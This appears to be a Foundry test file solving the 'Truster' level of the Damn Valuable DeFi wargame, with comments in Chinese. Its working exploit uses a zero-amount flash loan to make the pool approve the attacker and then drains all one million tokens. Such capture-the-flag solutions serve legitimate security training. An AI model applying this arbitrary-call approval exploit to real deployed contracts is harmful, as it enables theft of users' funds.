// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../../src/Contracts/truster/TrusterLenderPool.sol";

contract Truster is Test {
    uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;

    Utilities internal utils;
    TrusterLenderPool internal trusterLenderPool;
    DamnValuableToken internal dvt;
    address payable internal attacker;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        trusterLenderPool = new TrusterLenderPool(address(dvt));
        vm.label(address(trusterLenderPool), "Truster Lender Pool");

        dvt.transfer(address(trusterLenderPool), TOKENS_IN_POOL);

        assertEq(dvt.balanceOf(address(trusterLenderPool)), TOKENS_IN_POOL);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        // 正常閃電貸借款
        // 傳入 data 利用 trusterLenderPool's target.functionCall(data) 還錢給 trusterLenderPool
        vm.startPrank(attacker);
        bytes memory data = abi.encodeWithSignature(
            "transferFrom(address,address,uint256)", attacker, address(trusterLenderPool), TOKENS_IN_POOL
        );
        dvt.approve(address(trusterLenderPool), TOKENS_IN_POOL);
        trusterLenderPool.flashLoan(TOKENS_IN_POOL, attacker, address(dvt), data);
        vm.stopPrank();
        // 攻擊手法
        uint256 tokensInPool = dvt.balanceOf(address(trusterLenderPool));
        // bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(attacker), tokensInPool);
        data = abi.encodeWithSignature("approve(address,uint256)", address(attacker), tokensInPool);
        // bytes memory data = abi.encodeWithSignature(
        //     "flashLoan(uint256,address,address,bytes)", 0, attacker, address(this), new bytes(0x00)
        // );
        vm.startPrank(attacker);
        // 故意先跟 trusterLenderPool 借 0 元，然後利用 data (functionCall 漏洞) ， 將 trusterlenderPoll approve attacker 將錢轉轉給自己。
        trusterLenderPool.flashLoan(0, attacker, address(dvt), data);
        dvt.transferFrom(address(trusterLenderPool), attacker, tokensInPool);
        vm.stopPrank();
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertEq(dvt.balanceOf(address(trusterLenderPool)), 0);
        assertEq(dvt.balanceOf(address(attacker)), TOKENS_IN_POOL);
    }

    receive() external payable {}
}
